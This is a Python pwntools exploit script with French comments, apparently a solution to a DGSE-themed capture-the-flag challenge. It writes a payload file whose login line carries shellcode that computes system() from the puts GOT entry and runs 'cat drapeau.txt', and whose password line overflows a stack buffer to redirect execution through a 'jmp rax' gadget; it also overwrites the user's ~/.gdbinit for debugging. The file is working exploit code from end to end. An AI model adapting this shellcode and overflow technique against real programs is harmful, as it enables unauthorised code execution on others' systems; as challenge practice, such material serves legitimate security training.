#!/usr/bin/env python2.7
# coding: utf8

import struct
import array
import os
from pwn import *


context.update(arch='amd64', os='linux')

velf = ELF("./prog.bin")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

puts_got = velf.got['puts']
offset_puts_system = libc.symbols['puts'] - libc.symbols['system']
log.info("puts:   0x%x", puts_got)
log.info("system: +0x%x", offset_puts_system)


with open("response", "wb") as fp:

    # première ligne: le login, contient le shellcode

    fp.write(b'tototototo_')

    # on commence au 11ème octet. le 10ème est forcé à 0
    fp.write(asm("""

    movq rax, 0x1;                  /* la première instruction est modifiée par pcParm1[sVar2 - 1] = '\0'; */

    movq rax, 0x{:x};               /* puts@got.plt */
    movq rax,[rax];                 /* rax contient maintenant l'adresse de puts */
    sub rax, 0x{:x};                /* différence puts-system SUR la machine du challenge */

    lea rdi, [rip+2];               /* pointe après le jmp rax, donc sur la string */

    call rax;                       /* appelle system() */

    .string \"cat drapeau.txt\";

    """.format(puts_got, offset_puts_system)
    ))

    fp.write(b'\n')

    # deuxième ligne: le password qui provoque le buffer overflow

    fp.write(b'DGSE{link1234}##dgse{ZZ}')
    fp.write(b'DGSE{link1234}##dgse{ZZ}')

    fp.write(struct.pack('Q', 0))                         # rbp, osef
    fp.write(struct.pack('Q', 0x0000000000400605))        # rip: gadget "jmp rax"

    # code exécuté après le jmp rax: aller au shellcode
    fp.write(b'\xe9\x06\x00\x00\x00')                     # jmp +6

    fp.write(b'\n')


# gdb init pour suivre pas-à-pas ce qu'il se passe
with open(os.path.expanduser("~/.gdbinit"), "w") as fp:
    fp.write("""
source /opt/peda-master/peda.py
file prog.bin
b *0x0040089d
b *0x004008e0
b *0x00400931
run < response
""")
